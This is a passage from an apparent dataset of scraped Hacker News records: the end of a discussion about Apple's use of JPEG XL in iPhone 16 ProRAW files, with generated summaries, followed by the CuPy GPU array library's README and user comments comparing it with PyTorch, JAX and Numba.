reason. ProRAW or DNG on top of jpeg xl, I wouldn't buy yet... reply adityaathalyo 9 hours agorootparentprev> Nobody on the face of the earth is making a decision about whether or not to buy a new phone based on JPEG-XL support. \"Nobody\" - is that you speaking for everyone? Stop it. reply FollowingTheDao 7 hours agorootparentI literally read someone on Twitter saying they wanted to upgrade from a 13 pro max to be able to have access to JPEG XL. adityaathalyo, welcome to the club of people who cannot bring up ecological concerns about tech on HN. reply Gud 10 hours agorootparentprevThis is not “fake obsolence”. Your old devices works exactly how they did before. reply pooper 9 hours agorootparentI will give you another unrelated example to demonstrate fake obsolescence on an iPhone. For example, on the iPhone 13 Pro Max, You cannot set the battery to stop charging at 80%. You can do this with the new iPhone. I don't remember either 14 or 15, but you can't do this with the 13 Pro Max. So can you say that the iPhone 13 Promax is actually supported for so many years with the latest and greatest iOS When apple doesn't actually bring these new features. Back to the older version of iPhone? reply tzs 8 hours agorootparentFYI, you can get most of the same effect on your 13 Pro Max by plugging your charger into a smart plug, and using Shortcuts to make an automation that turns off the smart plug whenever the phone battery goes about 80%. I use that on my 10th generation iPad and used it on the iPhone X that I had up until about two months ago when it got replaced with a 15 which does support the \"charge to 80%\" option. It works great. The only minor annoyance I ran into was that the phones where the OS supports the 80% limit it will occasionally go to 100%, which they say is necessary to keep the battery level indicator calibrated. With the smart plug method you'll have to handle occasionally disabling the shortcut (or charging with the charger plugged straight into the outlet). Just make sure to pick a smart plug that can be turned off from Shortcuts. reply Asmod4n 8 hours agorootparentprevBy default all iPhones stop charging at 80% reply tzs 8 hours agorootparentThe \"stop at 80%\" option is 15 and later. I think you are thinking of the \"optimized charging\" option, which tries to guess how long you will be leaving the phone on the charger and then pauses when it reaches 80% until it gets near the time it thinks you are going to take the phone off the charger and then charges up to 100%. reply jiggawatts 9 hours agoparentprevOne of the tricks for achieving the target battery life is that photo and video formats are offloaded to dedicated and very power-efficient hardware in all mobile devices. The iPhone 16 is the first to get hardware offload for AV1 and JXL, which is why it'll support these formats. It's not just software, unlike in the PC world where going from 5W hardware decode to 50W software decode basically doesn't matter. reply illiac786 5 hours agorootparentIs that documented somewhere? reply brigade 12 hours agoparentprevThe CPU isn’t used for encoding video reply LtdJorge 10 hours agorootparentEncoding a single image with the CPU takes nothing compared to modern video codecs. reply brigade 10 hours agorootparentBurst mode captures 10 images per second, for encode demands of 120 MP/s. That’s half the throughput of 4k30. reply lupusreal 8 hours agorootparentIs there a cool down between bursts or can you do 10 a second for as many consecutive seconds as you like? You only have to get the images encoded and stored before the next burst starts, or at least before the user runs out of memory. reply lonjil 7 hours agorootparentprevThere's literally no way Apple developed a hardware accelerator for JXL encoding. So they're definitely using some kind of a CPU or generic DSP. reply JyrkiAlakuijala 2 hours agorootparentThey might have some things like DCTs and colorspace transforms accelerated. reply FollowingTheDao 7 hours agoparentprevThis makes me think: If JPEG-XL needs more computing power to decompress, does that out weigh the ecological benefit benefit of the smaller file size? reply pornel 7 hours agorootparentJPEG XL is pretty cheap to decompress. Advancements in compression algorithms also came with advancements in decompression speed. New algorithms like tANS are both compressing well, and have very fast implementations. And generally smaller files decompress faster, because there's just less data to process. reply FollowingTheDao 7 hours agorootparentBut how does the ecological benefit of space savings compare with the extra power consumption from compressing and decompressing? And will people take more pictures because of the space savings leading to more power consumption from compressing and decompressing the photos? Is this just greenwashing by Apple? But I have now decided to take my photos off of Apple's servers as well as to take way way less photographs, if any. The climate of my near future is way more important than a photograph of my cat. reply pornel 2 hours agorootparentYou have an invalid assumption that extra power is spent on better compression or decompression. It generally takes less energy to decompress a better-compressed file, because the decompression work is mostly proportional to the file size. Energy for compression varies greatly depending on codec and settings, but JPEG XL is among the fastest (cheapest) ones to compress. Secondly, you have an invalid assumption that the amounts of energy spent on compression have any real-world significance. Phones can take thousands of photos when working off a tiny battery, and most of it is spent on the screen. My rough calculation is that taking over a million photos takes less energy than there is in a gallon of gas. Apart form that, compression cost is generally completely ignored, because files are created only once, but viewed (decompressed) many many times over. Smaller files save storage space. Storage has costs in energy and hardware. Smaller files are quicker to transfer, and transfer itself can be more energy intensive than compression. It's still small in absolute numbers. reply modeless 12 hours agoprev> these .jxl files are wrapped in a DNG container, so you can’t just fire off .jxl files from the iPhone 16 Pro. Any move toward JPEG XL support is good, but this is lame. Even if the Chrome team comes to its senses and restores jxl support you won't be able to view these files. reply lonjil 7 hours agoparentAdobe added JXL as a compression option for the DNG format last year. Previous options were JPEG, Lossless JPEG, Deflate, and nothing. Apple used Lossless JPEG. Apple engineers have decided to take advantage of the option Adobe added last year to make their DNG files smaller. reply pornel 7 hours agoparentprevYou wouldn't want 24MB files with GPS and face detection metadata served raw on the Web anyway. reply modeless 2 hours agorootparentServing images from CDNs is not the only use case for browser JXL support. Browsers can perform client side processing of images before upload. They even host fully featured image editors like https://photopea.com. And sometimes you do want to see an original image from your camera in your browser, like say on the web version of Google Photos. reply contravariant 7 hours agorootparentprevI wouldn't want them on my phone either, but maybe that's just me. reply brigade 11 hours agoparentprevOf course it’s .dng; .jxl doesn’t carry the metadata needed to process a RAW image because it’s not intended for that. reply illiac786 5 hours agorootparentHmmm, is the jpeg xl data inside the dng not demosaicized? reply USiBqidmOOkAqRb 10 hours agorootparentprevWhich metadata exactly? Is the actual concern that someone unaware might accidentally stumble on the unprocessed image? reply brigade 10 hours agorootparentTo start with, without a linearization table, white and black levels, how exactly do you expect sensor data to be usefully interpreted? reply appendix-rock 10 hours agorootparentprevWhere did that come from? It feels like you’re working backwards from some bad feelings felt about Apple. reply makeitdouble 15 hours agoprevReading the whole piece a few days ago, it's a pretty good overview of the promises of JPEG XL. Apart from that, Apple's POV and PR bits being given such a central role felt a bit weird, especially as petapixel already spotted Samsung adopting JPEG XL months before Apple. Aside from the petty \"who was first\" bickering, it's a completely different move to adopt a common standard already accepted by rival companies on the android side, and it means we can really expect a larger adoption of JPEG XL than the other standards Apple just pitched on its own. That was the biggest beacon of hope IMHO, it would have benefited from more prominence. reply simondotau 13 hours agoparentAttaching any significance to being “first” on open standards is a game Apple rarely plays, but which others impose upon them because Apple’s adoption is (rightly or wrongly) seen as the most consequential and/or most newsworthy inflection point. reply makeitdouble 10 hours agorootparentIn the specific case of JPEG XL I think Google support will be the real inflection point: no chrome and default android support is a deal breaker for wide audience content publishers. The ironic part being of course that Chrome used to support it way too early, but support was dropped as nobody followed. So yes, Apple support is a big deal, but not more consequential than the other actors of the pretty vast ecosystems. reply scosman 15 hours agoprevThank god they went with a standard this time. When they launched HEIC, there wasn’t a single workable open source decoder. Hell, there wasn’t even a single non-Apple decoder. XL color depth looks amazing. reply rgovostes 14 hours agoparentAn annoying oversight is that while my Fujifilm camera is modern enough to shoot HEIF+RAW, Apple Photos only knows to group JPEG+RAW as a single photo. Because Apple did not spend a day of engineering time bringing feature parity for the file format they themselves promoted, it has turned into a bigger feature to match and merge the HEIF and RAW assets after the fact. After several years, I'm growing doubtful they'll ever accomplish it. I have yet to see whether they did it right with JXL+RAW (or is it DNG+RAW?) but hopefully they will before it becomes available in mainstream cameras. reply lonjil 7 hours agorootparentApple's ProRAW format is Linear DNG, that is to say, already debayered, not what most people would call \"raw\". Previously they've used Lossless JPEG for compression inside these DNG files, but now they use JXL. The DNG spec also allows for using JXL to compress proper raws, but I don't know if anyone is doing this yet. I know Samsung uses JXL compression in DNGs produced by their phones, but I haven't checked if those are proper raws or debayered. reply happyopossum 13 hours agoparentprevHEIC is a standard too - it wasn’t a secret internal Apple project… reply zenexer 13 hours agorootparentIt might be a standard, but for a long time the licensing costs were exorbitant, and that likely stifled adoption. While licensing costs have come down, the pushback against HEIC’s pricing led to the development of better, royalty-free alternatives—including JPEG XL. Thank god they went with an unencumbered standard this time. reply gambiting 12 hours agorootparentWindows showing you a popup saying you need to buy a £0.79 windows add on to just open photos taken with an iPhone was always unbelievable. Like some kind of malware or something. reply npteljes 10 hours agorootparentHaha, that's rich. I have never seen this popup (haven't had the use case), was it this one? https://helpdeskgeek.com/wp-content/pictures/2020/10/02-HEVC... reply gambiting 9 hours agorootparentYep, that's the one. reply throwaway17_17 12 hours agorootparentprevIn what context was thisnprompt appearing. I can not think of a time I have ever struggled to be able to open a photo from my iPhone in any of the apps I commonly use. Is this a Windows application issue or an OS issue, and how were the photos coming to your machine? Just to clarify, this is an honest question not sarcasm. reply swiftcoder 11 hours agorootparentIf you directly download the HEIC photos to your windows PC. The iPhone tends to convert to jpeg whenever you email/whatsapp/etc a photo, so it's only direct file import that nets the original HEIC file. reply gambiting 11 hours agorootparentExactly, I'd upload a bunch of photos to Google Drive to download to my PC, Google Drive could open them fine, but the default windows photo viewer app would demand payment to open them. reply astrange 10 hours agorootparentWell, Windows wouldn't display the HDR part of the image, so you're still not exactly seeing it. reply scosman 6 hours agorootparentprevNot really. It was a 2 company colab with a pseudo spec. But their implementation had quirks that weren’t in the spec, and weren’t documented anywhere. We spend a week building a decoder and kept finding new undocumented bits. I wouldn’t call it a standard when zero folks outside Apple had access a reliable decoder at launch. reply npteljes 10 hours agorootparentprevYes, OP worded this a bit incorrectly. Open source, royalty-free standard would be better. reply masklinn 14 hours agoparentprevThank god they went with a standard because when they went with a standard it wasn’t widespread? What? reply thecosmicfrog 10 hours agoprev> Compared to a standard JPEG, a JPEG XL file is up to 55% smaller I still find JPEG \"XL\" to be such a bizarre name. I would intuitively think it would result in larger file sizes. reply bmicraft 31 minutes agoparentThe XL probably relates to the fact that the relative savings increase with higher res pictures. Whereas original jpeg's file size might have scaled linearly, jxl could do better than that. reply 1000100_1000101 1 hour agoparentprevLets just call it JPEG 40 to avoid any confusion. reply oneeyedpigeon 9 hours agoparentprevAlthough it might seem confusing at first glance, having your selling point as \"our file sizes are larger!\" is so counterintuitive, that I think it's obviously not that! reply joaovitorbf 9 hours agorootparentSometimes it can be like \"our file sizes are larger, but look at this big list of cool features\". reply Iulioh 9 hours agoparentprevBigger is better, it is known. reply sho 14 hours agoprevSome more recent developments around browser support: https://www.phoronix.com/news/Mozilla-Interest-JPEG-XL-Rust reply MrAlex94 12 hours agoparentWeirdly enough, JPEG-XL support is actually fairly decent in Firefox already and there were patches developed by the community that work well for things such as color profiles, animation support etc. I’ve had them in Waterfox for a few years now - it was a purely “political” decision, if you want to call it that, to stop any more progress until recently. reply Washuu 12 hours agoparentprevFirefox Nightly is listed as supported on the jpegxl.info web site. My understanding is that it does not fully support the specification yet which is why it is not released to production. https://jpegxl.info/resources/supported-software.html reply iforgotpassword 12 hours agoparentprevMan this back and forth is really frustrating. So Google killed XL a while ago already and I feel like either Microsoft or Mozilla at least considered following suit. After Apple has done heic for a while now I assumed it might go that way regarding a jpeg replacement, but now they did a 180 and switched to xl. I mean good, it's not as patent encumbered, but wtf am I supposed to expect for the future now? Will Google add XL back to chrome? I guess it will take another decade or five until we have a jpeg replacement that's being universally agreed upon, because come on, it would be too easy if we don't get another plot twist where a major player jumps onto something else again for a while. reply JyrkiAlakuijala 2 hours agorootparentUse Jpegli for now. You can get half the benefits of JPEG XL with it. reply lonjil 7 hours agorootparentprev> So Google killed XL a while ago already and I feel like either Microsoft or Mozilla at least considered following suit. There's been JXL stuff visible in Windows 11 preview builds for months now. They might roll out support next year. reply cherioo 10 hours agoprevI don’t have iphone 16, and this article puzzles me. Is apple only using jxl for their “raw” camera capture, but not regular camera capture?? The non-raw use case seems to be the one that would have more impact to regular folks. Why? Is jxl inferior to HEIC? reply brigade 10 hours agoparentDNG spec added JPEG-XL as their modern codec. Both lossy and lossless modes are significantly better than the other 3 allowed codecs (JPEG, lossless JPEG, and zip.) reply oktoberpaard 10 hours agoparentprevProRAW files are large, so there's more potential to save space, making ProRAW a more attractive feature to use for a wider audience. reply praseodym 11 hours agoprevJPEG XL also supports re-encoding existing JPEG files to decrease file size while keeping the original file quality. That really seems like useful feature but so far I haven’t seen any tooling (in macOS) to re-encode my existing photo library. reply sureIy 11 hours agoparentIt would be safe to assume that Apple will eventually add a way to recompress your photo library to JXL… if they weren’t in the business of selling storage and cloud storage. They have in the past released tools to optimize storage so it wouldn’t be completely out of the ordinary, but… I wouldn’t hold my breath. reply appendix-rock 9 hours agorootparentSigh. I’ll happily hold my breath. Apple has done plenty to reduce use of storage. They even give you free iCloud storage to back your phone up when transferring to a new device. A very clear attractive source of penny pinching that they’ve put effort into to leaving on the table. This is tiring. reply CorrectHorseBat 8 hours agoparentprevNot just the original file quality, it's exactly the same image but (losslessly) compressed better. reply TacticalCoder 8 hours agoparentprev> but so far I haven’t seen any tooling (in macOS) to re-encode my existing photo library On Linux you can re-encode every single .jpg to .jxl and they'll decode bit-for-bit, to the original .jpg. On Debian and derivatives it's the libjxl-tools: the cjxl executable converts to .jxl and the djxl decompresses. Works flawlessly. P.S: as a sidenote there's zero reason anymore to serve a .jpg file to a browser when the browser supports .jxl files. That's just a waste of bandwith. (and if your stack cannot serve different files depending on the users' browsers' capacities, it's not much of a stack) reply larrysalibra 12 hours agoprevHow does JPEG XL compare to Apple’s current default HEIC? Is HEIC eventually going away in favor of JPEG XL? reply lonjil 7 hours agoparentThey aren't switching from HEIC to JXL. Apple uses HEIC for regular photos, but they use DNG with Lossless JPEG for \"ProRAW\". They are switching the latter to use JXL inside DNG instead of L-JPEG. reply dgreensp 4 hours agorootparentOk wow, that was not clear from the article. It also seems kind of confusing and unfortunate that Apple is using so many different image formats. reply EasyMark 4 hours agoprevIsn’t Samsung generally ahead of apple on most technical fronts though? Especially on mobile, I think people usually just assume apple just spends more effort on refining it, which is not a bad rule of thumb, but certainly not always the truth. reply dsego 9 hours agoprev> Compared to JPEG XL, HEIC — an implementation of HEIF — is just not good. I would've loved an explanation with this statement. reply astrange 10 hours agoprevIsn't it a little early to write this article? They haven't tried the implementation yet. reply 7e 10 hours agoprevI can’t wait for animated JPEG XL to replace animated GIF. reply bmicraft 25 minutes agoparentWell, most \"GIFs\" already really aren't that. Most image hosters already convert to and serve a silent looping h264 in it's place. reply bmicraft 27 minutes agoparentprevYou could already use apng and the file size isn't too bad. reply pornel 7 hours agoparentprevAnimated AVIF is widely supported, and can represent GIFs losslessly. BTW, Chrome vetoed the idea of supporting muted video files in `` like Safari does, so we've got this silly animated AVIF that is a video format that has been turned into a still image format that has been turned back into a video format, which takes regular AV1 video data but packages it in a slightly different way, enough to break video tooling. reply lonjil 7 hours agorootparent> Animated AVIF is widely supported, and can represent GIFs losslessly. Doesn't lossless AVIF have terrible compression ratios? reply pornel 3 hours agorootparentYou'd use lossless blocks for really simple pixel art that the GIF was made for. For GIFs made from video clips, you can apply regular video compression and decimate their size. reply edflsafoiewq 8 hours agoparentprevYou may be waiting a while. APNG and animated WebP are already widely rolled out, but haven't replaced GIF. reply account42 7 hours agorootparentNeither of these are well supported at all. APNG has a whole history of non-support by major browsers and animated WebP doesn't even have its own mime type so you can't fall back to gif/apng if support is not there - and support for webp does not guarantee support for animated webp. Both are also decidedly mediocre improvements over gif (which is quite the accomplishment considering how shit gif compression is). Really, animated WebP has little reason to exist. At least the lossy version should really just be a video file with no audio track and a convention for the loop metadata. Too bad that browsers decided to create yet another format (with intentionally crippled compression compared to webm) rather than allow silent videos intags. reply edflsafoiewq 7 hours agorootparentThey're both probably decades ahead of JXL. APNG has 96% browser support on caniuse after a surprise come-from-behind on Apple. The main reason for using GIF these days is you're on some platform where that's your only choice, so JXL is unlikely to change the status quo much. reply TiredOfLife 12 hours agoprevFor one you can't use Chrome to view those photos. note: the format was co-developed by Google who also makes Chome. reply lonjil 7 hours agoparentI don't think you can use Chrome to view any raw image files... reply swiftcoder 11 hours agoparentprevIndeed, but Chrome removed support for the format some time ago. reply weiliddat 14 hours agoprevIs part of the reason patents / licensing issues with HEVC that makes it harder to adopt? reply masklinn 14 hours agoparentThey already adopted it 7 years ago so no. reply weiliddat 3 hours agorootparentI don’t mean Apple but other parties reply 0x69420 12 hours agoprevplease tell me this means chromium will un-drop jxl and we can just stick them on the web like png/jpg/gif reply lencastre 13 hours agoprevCries in iPhone11Pro … also WTF!? Why not make QOK format and x266 available and exclusive to iPhone17 reply macinjosh 15 hours agoprevThe article states that because the file sizes are smaller the format is more environmentally friendly because, they state, \"All that stuff lives somewhere, and wherever it is, it requires energy to operate.\" Cold storage exists, as well as different tiers of storage. The hard drive on my shelf isn't using any energy. Are they storing all of their images in RAM? Maybe you could say this would lead to less use of storage space so less use of raw materials for storage devices. I would posit that it is possible this format is less environmentally friendly because it takes more compute cycles to produce the output from the compressed data, but I have no real insight into this just intuition. reply threeseed 14 hours agoparentMost iPhone users would be storing photos in iCloud. And most professionals are storing their photos in Creative Cloud. And in both cases the photo data would be replicated on multiple hard drives for redundancy. So it would definitely be more environmentally friendly to have smaller photos. The more important reason is that cloud storage costs significantly more than local. reply the_gorilla 13 hours agoparentprevIf people are going to take credit for crunching something down from 10 MB to 8 MB, I wish they'd also take the blame for massively bloating something into a modern monstrosity out of sheer laziness or betting that profit margins will be higher if they waste user time, storage, and cpu for the sake of releasing the project faster. reply jessekv 13 hours agoparentprev> Are they storing all of their images in RAM? Consider the millions of iPhone users uploading new photos and scrolling their iCloud-hosted photo library. A substantial amount of photo data is in RAM at any given moment, spread across many network devices. > I would posit that it is possible this format is less environmentally friendly because it takes more compute cycles I'm curious how much energy it takes to send bits over cellular or wifi, my intuition is that this is orders of magnitude higher than compression or encoding. reply astrange 10 hours agorootparent> I'm curious how much energy it takes to send bits over cellular or wifi, my intuition is that this is orders of magnitude higher than compression or encoding. Correct, but the computational cost of decoding a codec is generally correlated with the number of bits. So JXL is not necessarily more expensive to decode than older codecs, if it compresses better. reply r00fus 15 hours agoparentprevOn the other hand, we have industry defined standards to compress TCP headers [1] - incurring a cost to compress/decompress but resulting in lower packet sizes. [1] https://en.wikipedia.org/wiki/Robust_Header_Compression reply k310 14 hours agoparentprevWhat is environmentally (OK, mentally) unfriendly to me is the creation of new formats that various apps, and notably, websites where I post images, can't handle, so I swear a bit, convert the image to jpeg or png, and post. People are part of the environment, too! But lo! men have become the tools of their tools. ... Thoreau. reply astrange 10 hours agorootparentYou wouldn't like a website that accepted raw phone photos, because they're in HDR, and you'd get blinded by looking at them. Instagram already does this to me when I look at it at night, because it accepts HDR video. reply k310 3 hours agorootparentI'm still dealing daily with webp. I get a link to one and post the link, and the site does not render it. I have to download, convert, and upload to an image hosting site. The site has two admins dealing with twitter gyrations, \"Threads\" and possibly Mastodon, besides the daily chores and intruder nonsense. My phone and cameras are kind enough to give me jpegs. reply teddyh 12 hours agoparentprev> The hard drive on my shelf isn't using any energy But it is losing its data:reply xxs 14 hours agoparentprev> Are they storing all of their images in RAM? That part would not matter regardless. RAM is powered at all times, kept being refreshed too. Unless, of course you mean, they'd have to keep buying new machines to store more pictures. reply furyofantares 14 hours agoparentprev> The hard drive on my shelf isn't using any energy. When it filled up you put it on a shelf and bought a new one. reply kybernetyk 14 hours agorootparentThat's essentially what I do with my RAW files. One hard drive per year. It's still less expensive than every cloud storage I looked at. reply nottorp 13 hours agorootparentYou guys do do read tests occasionally, and transfer the data old drives to newer drives right? reply mikae1 13 hours agorootparentprevI hope you get two at least. Backups needed. reply semi-extrinsic 12 hours agoparentprevThis whataboutism we are hearing now about \"the energy needed to store your pictures\" is just corporate whataboutism, trying to push blame onto consumers. Let's say you have 2 TB of photos stored. If that's consuming more than 2 watts of electricity on average, the cloud providers have to be quite incompetent (they are mostly not). 2 watts is 1 kWh in 20 days, so 18 kWh in one year. The emissions from 18 kWh in the US is around 6 kg of CO2. This is the equivalent of driving a car for about 20 minutes on the highway, one time per year. Or spending 5 minutes longer in the shower 4 times per year. reply mihaaly 11 hours agoprev [–] Yes, yes, but 48mP only, when will they finally have 240MP on a sensor that can be mounted on the ass of an ant. But double the protrusion 6 times I guess for the lens supporting the new tech and whatnot (tele-macro at night in a panoramic sport event!), it may even take picture for you without thinking taking a picture, you purchased a smartphone didn't you, let it be smart then, it will know better than you what you need, how you need it, and when you need it, all is necessary to fix it to your forehead so it can see what you see, tiny bitsy inconvenience beyond storing and managing the billboard sized but polaroid quality stream of pics vomited out by the device - never to see the most. This good photo = phone deception marketers pushed on idiotic customers who actually pay the premium for the marketing material is pathetic. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The iPhone 16 introduces JPEG XL, a next-generation image format that offers better quality and smaller file sizes compared to standard JPEGs.",
      "JPEG XL supports wide-gamut and HDR images, offers up to 32 bits per channel, and can reduce file sizes by up to 55% while maintaining visual quality.",
      "Despite its advantages, JPEG XL is not widely adopted yet, with limited support from major browsers, but Apple’s inclusion in the iPhone 16 Pro may encourage broader adoption."
    ],
    "commentSummary": [
      "Apple's integration of JPEG XL in the iPhone 16 enhances photo quality and storage efficiency, offering up to 55% better compression than standard JPEGs.",
      "This is particularly advantageous for ProRAW images, which are large and can now be stored more efficiently, though currently limited to the latest iPhone models.",
      "Broader adoption by other companies, such as Samsung, indicates a promising future for JPEG XL, despite some concerns about compatibility and ecological impact."
    ],
    "points": 192,
    "commentCount": 132,
    "retryCount": 0,
    "time": 1726798245
  },
  {
    "id": 41601730,
    "title": "CuPy: NumPy and SciPy for GPU",
    "originLink": "https://github.com/cupy/cupy",
    "originBody": "CuPy : NumPy & SciPy for GPU WebsiteInstallTutorialExamplesDocumentationAPI ReferenceForum CuPy is a NumPy/SciPy-compatible array library for GPU-accelerated computing with Python. CuPy acts as a drop-in replacement to run existing NumPy/SciPy code on NVIDIA CUDA or AMD ROCm platforms. >>> import cupy as cp >>> x = cp.arange(6).reshape(2, 3).astype('f') >>> x array([[ 0., 1., 2.], [ 3., 4., 5.]], dtype=float32) >>> x.sum(axis=1) array([ 3., 12.], dtype=float32) CuPy also provides access to low-level CUDA features. You can pass ndarray to existing CUDA C/C++ programs via RawKernels, use Streams for performance, or even call CUDA Runtime APIs directly. Installation Pip Binary packages (wheels) are available for Linux and Windows on PyPI. Choose the right package for your platform. Platform Architecture Command CUDA 11.x (11.2+) x86_64 / aarch64 pip install cupy-cuda11x CUDA 12.x x86_64 / aarch64 pip install cupy-cuda12x ROCm 4.3 (experimental) x86_64 pip install cupy-rocm-4-3 ROCm 5.0 (experimental) x86_64 pip install cupy-rocm-5-0 Note To install pre-releases, append --pre -U -f https://pip.cupy.dev/pre (e.g., pip install cupy-cuda11x --pre -U -f https://pip.cupy.dev/pre). Conda Binary packages are also available for Linux and Windows on Conda-Forge. Platform Architecture Command CUDA x86_64 / aarch64 / ppc64le conda install -c conda-forge cupy If you need a slim installation (without also getting CUDA dependencies installed), you can do conda install -c conda-forge cupy-core. If you need to use a particular CUDA version (say 12.0), you can use the cuda-version metapackage to select the version, e.g. conda install -c conda-forge cupy cuda-version=12.0. Note If you encounter any problem with CuPy installed from conda-forge, please feel free to report to cupy-feedstock, and we will help investigate if it is just a packaging issue in conda-forge's recipe or a real issue in CuPy. Docker Use NVIDIA Container Toolkit to run CuPy container images. $ docker run --gpus all -it cupy/cupy Resources Installation Guide - instructions on building from source Release Notes Projects using CuPy Contribution Guide GPU Acceleration in Python using CuPy and Numba (GTC November 2021 Technical Session) GPU-Acceleration of Signal Processing Workflows using CuPy and cuSignal1 (ICASSP'21 Tutorial) License MIT License (see LICENSE file). CuPy is designed based on NumPy's API and SciPy's API (see docs/source/license.rst file). CuPy is being developed and maintained by Preferred Networks and community contributors. Reference Ryosuke Okuta, Yuya Unno, Daisuke Nishino, Shohei Hido and Crissman Loomis. CuPy: A NumPy-Compatible Library for NVIDIA GPU Calculations. Proceedings of Workshop on Machine Learning Systems (LearningSys) in The Thirty-first Annual Conference on Neural Information Processing Systems (NIPS), (2017). [PDF] @inproceedings{cupy_learningsys2017, author = \"Okuta, Ryosuke and Unno, Yuya and Nishino, Daisuke and Hido, Shohei and Loomis, Crissman\", title = \"CuPy: A NumPy-Compatible Library for NVIDIA GPU Calculations\", booktitle = \"Proceedings of Workshop on Machine Learning Systems (LearningSys) in The Thirty-first Annual Conference on Neural Information Processing Systems (NIPS)\", year = \"2017\", url = \"http://learningsys.org/nips17/assets/papers/paper_16.pdf\" } Footnotes cuSignal is now part of CuPy starting v13.0.0. ↩",
    "commentLink": "https://news.ycombinator.com/item?id=41601730",
    "commentBody": "CuPy: NumPy and SciPy for GPU (github.com/cupy)187 points by tanelpoder 5 hours agohidepastfavorite61 comments gjstein 4 hours agoThe idea that this is a drop in replacement for numpy (e.g., `import cupy as np`) is quite nice, though I've gotten similar benefit out of using `pytorch` for this purpose. It's a very popular and well-supported library with a syntax that's similar to numpy. However, the AMD-GPU compatibility for CuPy is quite an attractive feature. reply ogrisel 3 hours agoparentNote that NumPy, CuPy and PyTorch are all involved in the definition of a shared subset of their API: https://data-apis.org/array-api/ So it's possible to write array API code that consumes arrays from any of those libraries and delegate computation to them without having to explicitly import any of them in your source code. The only limitation for now is that PyTorch (and to some lower extent cupy as well) array API compliance is still incomplete and in practice one needs to go through this compatibility layer (hopefully temporarily): https://data-apis.org/array-api-compat/ reply ethbr1 3 hours agorootparentIt's interesting to see hardware/software/API co-development in practice again. The last time I think this happen at market-scale was early 3d accelerator APIs? Glide/opengl/directx. Which has been a minute! (To a lesser extent CPU vectorization extensions) Curious how much of Nvidia's successful strategy was driven by people who were there during that period. Powerful first mover flywheel: build high performing hardware that allows you to define an API -> people write useful software that targets your API, because you have the highest performance -> GOTO 10 (because now more software is standardized on your API, so you can build even more performant hardware to optimize its operations) reply kmaehashi 2 hours agorootparentprevAn excellent example of Array API usage can be found in scikit-learn. Estimators written in NumPy are now operable on various backends courtesy of Array API compatible libraries such as CuPy and PyTorch. https://scikit-learn.org/stable/modules/array_api.html Disclosure: I'm a CuPy maintainer. reply kccqzy 2 hours agorootparentprevAnd of course the native Python solution is memoryview. If you need to inter-operate with libraries like numpy but you cannot import numpy, use memoryview. It is specifically for fast low-level access which is why it has more C documentation than Python documentation: https://docs.python.org/3/c-api/memoryview.html reply KeplerBoy 4 hours agoparentprevOne could also \"import jax.numpy as jnp\". All those libraries have more or less complete implementations of numpy and scipy (i believe CuPy has the most functions, especially when it comes to scipy) functionality. Also: You can just mix match all those functions and tensors thanks to the __cuda_array_interface__. reply yobbo 3 hours agorootparentJax variables are immutable. Code written for CuPy looks similar to numpy but very different from Jax. reply bbminner 3 hours agorootparentAh, well, that's interesting! Does anyone know how cupy manages tensor mutability? reply kmaehashi 2 hours agorootparentCuPy tensors (or `ndarray`) provide the same semantics as NumPy. In-place operations are permitted. reply KeplerBoy 1 hour agorootparentprevAh yes, stumbled over that recently, but the error message is very helpful and it's a quick change. reply kmaehashi 2 hours agorootparentprevFor those interested in the NumPy/SciPy API coverage in CuPy, here is the comparison table: https://docs.cupy.dev/en/latest/reference/comparison.html reply WCSTombs 39 minutes agoparentprev> However, the AMD-GPU compatibility for CuPy is quite an attractive feature. Last I checked (a couple months ago) it wasn't quite there, but I totally agree in principle. I've not gotten it to work on my Radeons yet. reply hedgehog 1 hour agoparentprevIt's kind of unfortunate that EagerPy didn't get more traction to make that kind of switching even easier. reply Narhem 44 minutes agoparentprevAs nice as it is to have a drop in replacement, most of the cost of GPU computing is moving memory around. Wouldn’t be surprised if this catches unsuspecting programmers in a few performance traps. reply amarcheschi 2 hours agoparentprevI'm supposed to end my undergraduate degree with an internship at the italian national research center and i'll have to use pytorch to write ml models from paper to code, i've tried looking at the tutorial but i feel like there's a lot going on to grasp. until now i've only used numpy (and pandas in combo with numpy), i'm quite excited but i'm a bit on the edge because i can't know whether i'll be up to the task or not reply KeplerBoy 1 hour agorootparentGo for it! There's nothing to lose. You could checkout some of EuroCC's courses. That should get you up to speed. https://www.eurocc-access.eu/services/training/ reply curvilinear_m 1 hour agoprevI'm surprised to see pytorch and Jax mentioned as alternatives but not numba : https://github.com/numba/numba I've recently had to implement a few kernels to lower the memory footprint and runtime of some pytorch function : it's been really nice because numba kernels have type hints support (as opposed to raw cupy kernels). reply johndough 3 hours agoprevCuPy is probably the easiest way to interface with custom CUDA kernels: https://docs.cupy.dev/en/stable/user_guide/kernel.html#raw-k... And I recently learned that CuPy has a JIT compiler now if you prefer Python syntax over C++. https://docs.cupy.dev/en/stable/user_guide/kernel.html#jit-k... reply einpoklum 57 minutes agoparent> probably the easiest way to interface with custom CUDA kernels In Python? Perhaps. Generally? No, it isn't. Try: https://github.com/eyalroz/cuda-api-wrappers/ Full power of the CUDA APIs including all runtime compilation options etc. (Yes, I wrote that...) reply meisel 4 hours agoprevWhen building something that I want to run on both CPU and GPU, depending, I’ve found it much easier to use PyTorch than some combination of NumPy and CuPy. I don’t have to fiddle around with some global replacing of numpy.* with cupy.*, and PyTorch has very nearly all the functions that those libraries have. reply setopt 50 minutes agoparentInteresting. Any links to examples or docs on how to use PyTorch as a general linear algebra library for this purpose? Like a “SciPy to PyTorch” transition guide if I want to do the same? reply setopt 1 hour agoprevI’ve been using CuPy a bit and found it to be excellent. It’s very easy to replace some slow NumPy/SciPy calls with appropriate CuPy calls, with sometimes literally a 1000x performance boost from like 10min work. It’s also easy to write “hybrid code” where you can switch between NumPy and CuPy depending on what’s available. reply glial 1 hour agoparentAre you able to share what functions or situations result in speedups? In my experience, vectorized numpy is already fast, so I'm very curious. reply setopt 32 minutes agorootparentThe largest speedup I have seen was for a quantum mechanics simulation where I needed to repeatedly calculate all eigenvalues of Hermitian matrices (but not necessarily their eigenvectors). This was basically the code needed: import scipy.linalg as la if cuda: import cupy as cp import cupy.linalg as cla ε = cp.asnumpy(cla.eigvalsh(cp.asarray(H))) else: ε = la.eigvalsh(H) I was using IntelPython which already has fast (parallelized) methods for this using MKL, but CuPy blew it out of the water. reply KeplerBoy 1 hour agorootparentprevNot OP, but think about stuff like FFTs or Matmuls. It's not even a competition, GPUs win when the algorithm is somewhat suitable and you're dealing with FP32 or lower precision. reply __mharrison__ 4 hours 